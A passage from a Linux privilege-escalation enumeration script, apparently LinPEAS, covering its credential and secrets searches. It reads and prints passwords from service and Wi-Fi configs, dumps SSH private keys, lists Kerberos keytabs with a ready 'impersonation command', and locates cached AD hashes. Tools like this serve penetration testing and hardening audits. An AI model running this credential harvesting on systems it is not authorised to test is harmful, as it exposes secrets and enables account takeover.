  3609	    if ! [ "`echo \"$PSTORAGE_CESI\" | grep -E \"cesi\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cesi.conf"; fi; fi; printf "%s" "$PSTORAGE_CESI" | grep -E "cesi\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cesi\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "username.*=|password.*=|host.*=|port.*=|database.*=" | sed -${E} "s,username.*=|password.*=|host.*=|port.*=|database.*=,${SED_RED},g"; done; echo "";
  3610	fi
  3611	
  3612	
  3613	if [ "$PSTORAGE_RSYNC" ] || [ "$DEBUG" ]; then
  3614	  print_2title "Analyzing Rsync Files (limit 70)"
  3615	    if ! [ "`echo \"$PSTORAGE_RSYNC\" | grep -E \"rsyncd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rsyncd.conf"; fi; fi; printf "%s" "$PSTORAGE_RSYNC" | grep -E "rsyncd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rsyncd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,secrets.*|auth.*users.*=,${SED_RED},g"; done; echo "";
  3616	    if ! [ "`echo \"$PSTORAGE_RSYNC\" | grep -E \"rsyncd\.secrets$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rsyncd.secrets"; fi; fi; printf "%s" "$PSTORAGE_RSYNC" | grep -E "rsyncd\.secrets$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rsyncd\.secrets$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  3617	fi
  3618	
  3619	
  3620	if [ "$PSTORAGE_HOSTAPD" ] || [ "$DEBUG" ]; then
  3621	  print_2title "Analyzing Hostapd Files (limit 70)"
  3622	    if ! [ "`echo \"$PSTORAGE_HOSTAPD\" | grep -E \"hostapd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hostapd.conf"; fi; fi; printf "%s" "$PSTORAGE_HOSTAPD" | grep -E "hostapd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hostapd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,passphrase.*,${SED_RED},g"; done; echo "";
  3623	fi
  3624	
  3625	
  3626	if [ "$PSTORAGE_WIFI_CONNECTIONS" ] || [ "$DEBUG" ]; then
  3627	  print_2title "Analyzing Wifi Connections Files (limit 70)"
  3628	    if ! [ "`echo \"$PSTORAGE_WIFI_CONNECTIONS\" | grep -E \"system-connections$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "system-connections"; fi; fi; printf "%s" "$PSTORAGE_WIFI_CONNECTIONS" | grep -E "system-connections$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,system-connections$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "psk.*" | sed -${E} "s,psk.*,${SED_RED},g"; done; echo "";done; echo "";
  3629	fi
  3630	
  3631	
  3632	if [ "$PSTORAGE_ANACONDA_KS" ] || [ "$DEBUG" ]; then
  3633	  print_2title "Analyzing Anaconda ks Files (limit 70)"
  3634	    if ! [ "`echo \"$PSTORAGE_ANACONDA_KS\" | grep -E \"anaconda-ks\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "anaconda-ks.cfg"; fi; fi; printf "%s" "$PSTORAGE_ANACONDA_KS" | grep -E "anaconda-ks\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,anaconda-ks\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "rootpw.*" | sed -${E} "s,rootpw.*,${SED_RED},g"; done; echo "";
  3635	fi
  3636	
  3637	
  3638	if [ "$PSTORAGE_VNC" ] || [ "$DEBUG" ]; then
  3639	  print_2title "Analyzing VNC Files (limit 70)"
  3640	    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"\.vnc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".vnc"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "\.vnc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vnc$,${SED_RED},"; find "$f" -name "passwd" | while read ff; do ls -ld "$ff" | sed -${E} "s,passwd,${SED_RED},"; done; echo "";done; echo "";
  3641	    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.c.*nf.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.c*nf*"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.c.*nf.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.c.*nf.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  3642	    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.ini"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.ini$,${SED_RED},"; done; echo "";
  3643	    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.txt"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  3644	    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.xml"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  3645	fi
  3646	
  3647	
  3648	if [ "$PSTORAGE_OPENVPN" ] || [ "$DEBUG" ]; then
  3649	  print_2title "Analyzing OpenVPN Files (limit 70)"
  3650	    if ! [ "`echo \"$PSTORAGE_OPENVPN\" | grep -E \"\.ovpn$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.ovpn"; fi; fi; printf "%s" "$PSTORAGE_OPENVPN" | grep -E "\.ovpn$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ovpn$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "auth-user-pass.+" | sed -${E} "s,auth-user-pass.+,${SED_RED},g"; done; echo "";
  3651	fi
  3652	
  3653	
  3654	if [ "$PSTORAGE_LDAP" ] || [ "$DEBUG" ]; then
  3655	  print_2title "Analyzing Ldap Files (limit 70)"
  3656	    echo "The password hash is from the {SSHA} to 'structural'"
  3657	    if ! [ "`echo \"$PSTORAGE_LDAP\" | grep -E \"ldap$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ldap"; fi; fi; printf "%s" "$PSTORAGE_LDAP" | grep -E "ldap$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ldap$,${SED_RED},"; find "$f" -name "*.bdb" | while read ff; do ls -ld "$ff" | sed -${E} "s,.bdb,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E -i -a -o "description.*" | sort | uniq | sed -${E} "s,administrator|password|ADMINISTRATOR|PASSWORD|Password|Administrator,${SED_RED},g"; done; echo "";done; echo "";
  3658	fi
  3659	
  3660	
  3661	if [ "$PSTORAGE_LOG4SHELL" ] || [ "$DEBUG" ]; then
  3662	  print_2title "Searching Log4Shell vulnerable libraries"
  3663	  printf "%s\n" "$PSTORAGE_LOG4SHELL" | while read f; do
  3664	    echo "$f" | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])" | sed -${E} "s,log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6]),${SED_RED},";
  3665	  done
  3666	  echo ""
  3667	fi
  3668	
  3669	#-- SI) ssh files
  3670	print_2title "Searching ssl/ssh files"
  3671	if [ "$PSTORAGE_CERTSB4" ]; then certsb4_grep=$(grep -L "\"\|'\|(" $PSTORAGE_CERTSB4 2>/dev/null); fi
  3672	if ! [ "$SEARCH_IN_FOLDER" ]; then
  3673	  sshconfig="$(ls /etc/ssh/ssh_config 2>/dev/null)"
  3674	  hostsdenied="$(ls /etc/hosts.denied 2>/dev/null)"
  3675	  hostsallow="$(ls /etc/hosts.allow 2>/dev/null)"
  3676	  writable_agents=$(find /tmp /etc /home -type s -name "agent.*" -or -name "*gpg-agent*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)
  3677	else
  3678	  sshconfig="$(ls ${ROOT_FOLDER}etc/ssh/ssh_config 2>/dev/null)"
  3679	  hostsdenied="$(ls ${ROOT_FOLDER}etc/hosts.denied 2>/dev/null)"
  3680	  hostsallow="$(ls ${ROOT_FOLDER}etc/hosts.allow 2>/dev/null)"
  3681	  writable_agents=$(find  ${ROOT_FOLDER} -type s -name "agent.*" -or -name "*gpg-agent*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)
  3682	fi
  3683	
  3684	if [ "$PSTORAGE_SSH" ] || [ "$DEBUG" ]; then
  3685	  print_2title "Analyzing SSH Files (limit 70)"
  3686	    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"id_dsa.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "id_dsa*"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "id_dsa.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,id_dsa.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  3687	    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"id_rsa.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "id_rsa*"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "id_rsa.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,id_rsa.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  3688	    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"known_hosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "known_hosts"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "known_hosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,known_hosts$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  3689	    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"authorized_hosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "authorized_hosts"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "authorized_hosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,authorized_hosts$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  3690	    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"authorized_keys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "authorized_keys"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "authorized_keys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,authorized_keys$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,from=[\w\._\-]+,${SED_GOOD},g"; done; echo "";
  3691	fi
  3692	
  3693	
  3694	grep "PermitRootLogin \|ChallengeResponseAuthentication \|PasswordAuthentication \|UsePAM \|Port\|PermitEmptyPasswords\|PubkeyAuthentication\|ListenAddress\|ForwardAgent\|AllowAgentForwarding\|AuthorizedKeysFiles" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | sed -${E} "s,PermitRootLogin.*es|PermitEmptyPasswords.*es|ChallengeResponseAuthentication.*es|FordwardAgent.*es,${SED_RED},"
  3695	
  3696	if ! [ "$SEARCH_IN_FOLDER" ]; then
  3697	  if [ "$TIMEOUT" ]; then
  3698	    privatekeyfilesetc=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null)
  3699	    privatekeyfileshome=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOMESEARCH 2>/dev/null)
  3700	    privatekeyfilesroot=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /root 2>/dev/null)
  3701	    privatekeyfilesmnt=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /mnt 2>/dev/null)
  3702	  else
  3703	    privatekeyfilesetc=$(grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null) #If there is tons of files linpeas gets frozen here without a timeout
  3704	    privatekeyfileshome=$(grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOME/.ssh 2>/dev/null)
  3705	  fi
  3706	else
  3707	  # If $SEARCH_IN_FOLDER lets just search for private keys in the whole firmware
  3708	  privatekeyfilesetc=$(timeout 120 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' "$ROOT_FOLDER" 2>/dev/null)
  3709	fi
  3710	
  3711	if [ "$privatekeyfilesetc" ] || [ "$privatekeyfileshome" ] || [ "$privatekeyfilesroot" ] || [ "$privatekeyfilesmnt" ] ; then
  3712	  echo ""
  3713	  print_3title "Possible private SSH keys were found!" | sed -${E} "s,private SSH keys,${SED_RED},"
  3714	  if [ "$privatekeyfilesetc" ]; then printf "$privatekeyfilesetc\n" | sed -${E} "s,.*,${SED_RED},"; fi
  3715	  if [ "$privatekeyfileshome" ]; then printf "$privatekeyfileshome\n" | sed -${E} "s,.*,${SED_RED},"; fi
  3716	  if [ "$privatekeyfilesroot" ]; then printf "$privatekeyfilesroot\n" | sed -${E} "s,.*,${SED_RED},"; fi
  3717	  if [ "$privatekeyfilesmnt" ]; then printf "$privatekeyfilesmnt\n" | sed -${E} "s,.*,${SED_RED},"; fi
  3718	  echo ""
  3719	fi
  3720	if [ "$certsb4_grep" ] || [ "$PSTORAGE_CERTSBIN" ]; then
  3721	  print_3title "Some certificates were found (out limited):"
  3722	  printf "$certsb4_grep\n" | head -n 20
  3723	  printf "$$PSTORAGE_CERTSBIN\n" | head -n 20
  3724	    echo ""
  3725	fi
  3726	if [ "$PSTORAGE_CERTSCLIENT" ]; then
  3727	  print_3title "Some client certificates were found:"
  3728	  printf "$PSTORAGE_CERTSCLIENT\n"
  3729	  echo ""
  3730	fi
  3731	if [ "$PSTORAGE_SSH_AGENTS" ]; then
  3732	  print_3title "Some SSH Agent files were found:"
  3733	  printf "$PSTORAGE_SSH_AGENTS\n"
  3734	  echo ""
  3735	fi
  3736	if ssh-add -l 2>/dev/null | grep -qv 'no identities'; then
  3737	  print_3title "Listing SSH Agents"
  3738	  ssh-add -l
  3739	  echo ""
  3740	fi
  3741	if gpg-connect-agent "keyinfo --list" /bye 2>/dev/null | grep "D - - 1"; then
  3742	  print_3title "Listing gpg keys cached in gpg-agent"
  3743	  gpg-connect-agent "keyinfo --list" /bye
  3744	  echo ""
  3745	fi
  3746	if [ "$writable_agents" ]; then
  3747	  print_3title "Writable ssh and gpg agents"
  3748	  printf "%s\n" "$writable_agents"
  3749	fi
  3750	if [ "$PSTORAGE_SSH_CONFIG" ]; then
  3751	  print_3title "Some home ssh config file was found"
  3752	  printf "%s\n" "$PSTORAGE_SSH_CONFIG" | while read f; do ls "$f" | sed -${E} "s,$f,${SED_RED},"; cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,User|ProxyCommand,${SED_RED},"; done
  3753	  echo ""
  3754	fi
  3755	if [ "$hostsdenied" ]; then
  3756	  print_3title "/etc/hosts.denied file found, read the rules:"
  3757	  printf "$hostsdenied\n"
  3758	  cat " ${ROOT_FOLDER}etc/hosts.denied" 2>/dev/null | grep -v "#" | grep -Iv "^$" | sed -${E} "s,.*,${SED_GREEN},"
  3759	  echo ""
  3760	fi
  3761	if [ "$hostsallow" ]; then
  3762	  print_3title "/etc/hosts.allow file found, trying to read the rules:"
  3763	  printf "$hostsallow\n"
  3764	  cat " ${ROOT_FOLDER}etc/hosts.allow" 2>/dev/null | grep -v "#" | grep -Iv "^$" | sed -${E} "s,.*,${SED_RED},"
  3765	  echo ""
  3766	fi
  3767	if [ "$sshconfig" ]; then
  3768	  echo ""
  3769	  echo "Searching inside /etc/ssh/ssh_config for interesting info"
  3770	  grep -v "^#"  ${ROOT_FOLDER}etc/ssh/ssh_config 2>/dev/null | grep -Ev "\W+\#|^#" 2>/dev/null | grep -Iv "^$" | sed -${E} "s,Host|ForwardAgent|User|ProxyCommand,${SED_RED},"
  3771	fi
  3772	echo ""
  3773	
  3774	if [ "$PSTORAGE_PAM_AUTH" ] || [ "$DEBUG" ]; then
  3775	  print_2title "Analyzing PAM Auth Files (limit 70)"
  3776	    if ! [ "`echo \"$PSTORAGE_PAM_AUTH\" | grep -E \"pam\.d$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pam.d"; fi; fi; printf "%s" "$PSTORAGE_PAM_AUTH" | grep -E "pam\.d$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pam\.d$,${SED_RED},"; find "$f" -name "sshd" | while read ff; do ls -ld "$ff" | sed -${E} "s,sshd,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#|^@" | sed -${E} "s,auth|accessfile=|secret=|user,${SED_RED},g"; done; echo "";done; echo "";
  3777	fi
  3778	
  3779	
  3780	#-- SI) Passwords inside pam.d
  3781	pamdpass=$(grep -Ri "passwd"  ${ROOT_FOLDER}etc/pam.d/ 2>/dev/null | grep -v ":#")
  3782	if [ "$pamdpass" ] || [ "$DEBUG" ]; then
  3783	  print_2title "Passwords inside pam.d"
  3784	  grep -Ri "passwd"  ${ROOT_FOLDER}etc/pam.d/ 2>/dev/null | grep -v ":#" | sed "s,passwd,${SED_RED},"
  3785	  echo ""
  3786	fi
  3787	
  3788	if [ "$PSTORAGE_NFS_EXPORTS" ] || [ "$DEBUG" ]; then
  3789	  print_2title "Analyzing NFS Exports Files (limit 70)"
  3790	    nfsmounts=`cat /proc/mounts 2>/dev/null | grep nfs`; if [ "$nfsmounts" ]; then echo -e "Connected NFS Mounts: \n$nfsmounts"; fi
  3791	    if ! [ "`echo \"$PSTORAGE_NFS_EXPORTS\" | grep -E \"exports$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "exports"; fi; fi; printf "%s" "$PSTORAGE_NFS_EXPORTS" | grep -E "exports$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,exports$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,insecure|rw|nohide,${SED_RED},g" | sed -${E} "s,no_root_squash|no_all_squash,${SED_RED_YELLOW},g"; done; echo "";
  3792	fi
  3793	
  3794	
  3795	#-- SI) Kerberos
  3796	kadmin_exists="$(command -v kadmin)"
  3797	klist_exists="$(command -v klist)"
  3798	kinit_exists="$(command -v kinit)"
  3799	if [ "$kadmin_exists" ] || [ "$klist_exists" ] || [ "$kinit_exists" ] || [ "$PSTORAGE_KERBEROS" ] || [ "$DEBUG" ]; then
  3800	  print_2title "Searching kerberos conf files and tickets"
  3801	  print_info "http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory"
  3802	
  3803	  if [ "$kadmin_exists" ]; then echo "kadmin was found on $kadmin_exists" | sed "s,$kadmin_exists,${SED_RED},"; fi
  3804	  if [ "$kinit_exists" ]; then echo "kadmin was found on $kinit_exists" | sed "s,$kinit_exists,${SED_RED},"; fi
  3805	  if [ "$klist_exists" ] && [ -x "$klist_exists" ]; then echo "klist execution"; klist; fi
  3806	  ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
  3807	  if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then echo "ptrace protection is disabled (0), you might find tickets inside processes memory" | sed "s,is disabled,${SED_RED},g";
  3808	  else echo "ptrace protection is enabled ($ptrace_scope), you need to disable it to search for tickets inside processes memory" | sed "s,is enabled,${SED_GREEN},g";
  3809	  fi
  3810	  
  3811	  (env || printenv) 2>/dev/null | grep -E "^KRB5" | sed -${E} "s,KRB5,${SED_RED},g"
  3812	
  3813	  printf "%s\n" "$PSTORAGE_KERBEROS" | while read f; do
  3814	    if [ -r "$f" ]; then
  3815	      if echo "$f" | grep -q .k5login; then
  3816	        echo ".k5login file (users with access to the user who has this file in his home)"
  3817	        cat "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},g"
  3818	      elif echo "$f" | grep -q keytab; then
  3819	        echo ""
  3820	        echo "keytab file found, you may be able to impersonate some kerberos principals and add users or modify passwords"
  3821	        klist -k "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},g"
  3822	        printf "$(klist -k $f 2>/dev/null)\n" | awk '{print $2}' | while read l; do
  3823	          if [ "$l" ] && echo "$l" | grep -q "@"; then
  3824	            printf "$ITALIC  --- Impersonation command: ${NC}kadmin -k -t /etc/krb5.keytab -p \"$l\"\n" | sed -${E} "s,$l,${SED_RED},g"
  3825	            #kadmin -k -t /etc/krb5.keytab -p "$l" -q getprivs 2>/dev/null #This should show the permissions of each impersoanted user, the thing is that in a test it showed that every user had the same permissions (even if they didn't). So this test isn't valid
  3826	            #We could also try to create a new user or modify a password, but I'm not user if linpeas should do that
  3827	          fi
  3828	        done
  3829	      elif echo "$f" | grep -q krb5.conf; then
  3830	        ls -l "$f"
  3831	        cat "$f" 2>/dev/null | sed -${E} "s,default_ccache_name,${SED_RED},";
  3832	      elif echo "$f" | grep -q kadm5.acl; then
  3833	        ls -l "$f" 
  3834	        cat "$f" 2>/dev/null
  3835	      elif echo "$f" | grep -q sssd.conf; then
  3836	        ls -l "$f"
  3837	        cat "$f" 2>/dev/null | sed -${E} "s,cache_credentials ?= ?[tT][rR][uU][eE],${SED_RED},";
  3838	      elif echo "$f" | grep -q secrets.ldb; then
  3839	        echo "You could use SSSDKCMExtractor to extract the tickets stored here" | sed -${E} "s,SSSDKCMExtractor,${SED_RED},";
  3840	        ls -l "$f"
  3841	      elif echo "$f" | grep -q .secrets.mkey; then
  3842	        echo "This is the secrets file to use with SSSDKCMExtractor" | sed -${E} "s,SSSDKCMExtractor,${SED_RED},";
  3843	        ls -l "$f"
  3844	      fi
  3845	    fi
  3846	  done
  3847	  ls -l "/tmp/krb5cc*" "/var/lib/sss/db/ccache_*" "/etc/opt/quest/vas/host.keytab" 2>/dev/null || echo_not_found "tickets kerberos"
  3848	  klist 2>/dev/null || echo_not_found "klist"
  3849	  echo ""
  3850	
  3851	fi
  3852	
  3853	if [ "$PSTORAGE_FREEIPA" ] || [ "$DEBUG" ]; then
  3854	  print_2title "Analyzing FreeIPA Files (limit 70)"
  3855	    ipa_exists="$(command -v ipa)"; if [ "$ipa_exists" ]; then print_info "https://book.hacktricks.xyz/linux-hardening/freeipa-pentesting"; fi
  3856	    if ! [ "`echo \"$PSTORAGE_FREEIPA\" | grep -E \"ipa$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipa"; fi; fi; printf "%s" "$PSTORAGE_FREEIPA" | grep -E "ipa$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipa$,${SED_RED},"; find "$f" -name "default.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,default.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$"; done; echo "";done; echo "";
  3857	    if ! [ "`echo \"$PSTORAGE_FREEIPA\" | grep -E \"dirsrv$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "dirsrv"; fi; fi; printf "%s" "$PSTORAGE_FREEIPA" | grep -E "dirsrv$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,dirsrv$,${SED_RED},"; find "$f" -name "id2rntry.db" | while read ff; do ls -ld "$ff" | sed -${E} "s,id2rntry.db,${SED_RED},"; done; echo "";done; echo "";
  3858	fi
  3859	
  3860	
  3861	if [ "$PSTORAGE_KNOCKD" ] || [ "$DEBUG" ]; then
  3862	  print_2title "Analyzing Knockd Files (limit 70)"
  3863	    if ! [ "`echo \"$PSTORAGE_KNOCKD\" | grep -E \"knockd.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*knockd*"; fi; fi; printf "%s" "$PSTORAGE_KNOCKD" | grep -E "knockd.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,knockd.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  3864	fi
  3865	
  3866	
  3867	if [ "$PSTORAGE_KIBANA" ] || [ "$DEBUG" ]; then
  3868	  print_2title "Analyzing Kibana Files (limit 70)"
  3869	    if ! [ "`echo \"$PSTORAGE_KIBANA\" | grep -E \"kibana\.y.*ml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kibana.y*ml"; fi; fi; printf "%s" "$PSTORAGE_KIBANA" | grep -E "kibana\.y.*ml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kibana\.y.*ml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#|^[[:space:]]*$" | sed -${E} "s,username|password|host|port|elasticsearch|ssl,${SED_RED},g"; done; echo "";
  3870	fi
  3871	
  3872	
  3873	if [ "$PSTORAGE_ELASTICSEARCH" ] || [ "$DEBUG" ]; then
  3874	  print_2title "Analyzing Elasticsearch Files (limit 70)"
  3875	    echo "The version is $(curl -X GET '127.0.0.1:9200' 2>/dev/null | grep number | cut -d ':' -f 2)"
  3876	    if ! [ "`echo \"$PSTORAGE_ELASTICSEARCH\" | grep -E \"elasticsearch\.y.*ml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "elasticsearch.y*ml"; fi; fi; printf "%s" "$PSTORAGE_ELASTICSEARCH" | grep -E "elasticsearch\.y.*ml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,elasticsearch\.y.*ml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "path.data|path.logs|cluster.name|node.name|network.host|discovery.zen.ping.unicast.hosts" | grep -Ev "\W+\#|^#"; done; echo "";
  3877	fi
  3878	
  3879	
  3880	##-- SI) Logstash
  3881	if [ "$PSTORAGE_LOGSTASH" ] || [ "$DEBUG" ]; then
  3882	  print_2title "Searching logstash files"
  3883	  printf "$PSTORAGE_LOGSTASH"
  3884	  printf "%s\n" "$PSTORAGE_LOGSTASH" | while read d; do
  3885	    if [ -r "$d/startup.options" ]; then
  3886	      echo "Logstash is running as user:"
  3887	      cat "$d/startup.options" 2>/dev/null | grep "LS_USER\|LS_GROUP" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed -${E} "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,root,${SED_RED},"
  3888	    fi
  3889	    cat "$d/conf.d/out*" | grep "exec\s*{\|command\s*=>" | sed -${E} "s,exec\W*\{|command\W*=>,${SED_RED},"
  3890	    cat "$d/conf.d/filt*" | grep "path\s*=>\|code\s*=>\|ruby\s*{" | sed -${E} "s,path\W*=>|code\W*=>|ruby\W*\{,${SED_RED},"
  3891	  done
  3892	fi
  3893	echo ""
  3894	
  3895	#-- SI) Vault-ssh
  3896	if [ "$PSTORAGE_VAULT_SSH_HELPER" ] || [ "$DEBUG" ]; then
  3897	  print_2title "Searching Vault-ssh files"
  3898	  printf "$PSTORAGE_VAULT_SSH_HELPER\n"
  3899	  printf "%s\n" "$PSTORAGE_VAULT_SSH_HELPER" | while read f; do cat "$f" 2>/dev/null; vault-ssh-helper -verify-only -config "$f" 2>/dev/null; done
  3900	  echo ""
  3901	  vault secrets list 2>/dev/null
  3902	  printf "%s\n" "$PSTORAGE_VAULT_SSH_TOKEN" | sed -${E} "s,.*,${SED_RED}," 2>/dev/null
  3903	fi
  3904	echo ""
  3905	
  3906	#-- SI) Cached AD Hashes
  3907	adhashes=$(ls "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null)
  3908	if [ "$adhashes" ] || [ "$DEBUG" ]; then
  3909	  print_2title "Searching AD cached hashes"
  3910	  ls -l "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null
  3911	  echo ""
  3912	fi
  3913	
  3914	#-- SI) Screen sessions
